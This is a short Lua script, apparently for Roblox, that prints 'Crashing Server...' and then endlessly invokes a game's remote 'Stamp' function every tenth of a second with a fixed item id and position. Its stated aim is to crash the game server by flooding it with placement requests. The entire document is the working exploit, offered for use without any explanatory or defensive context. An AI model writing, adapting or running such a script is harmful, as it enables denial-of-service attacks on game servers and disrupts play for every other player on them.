warn'Crashing Server...'

while true do
wait(0.1)
local id = 41324885
local cf = CFrame.new(77, 49.7000008, -439, 1, 0, 0, 0, 1, 0, 0, 0, 1)
game:GetService("ReplicatedStorage").BuildingBridge.Stamp:InvokeServer(id, cf)
end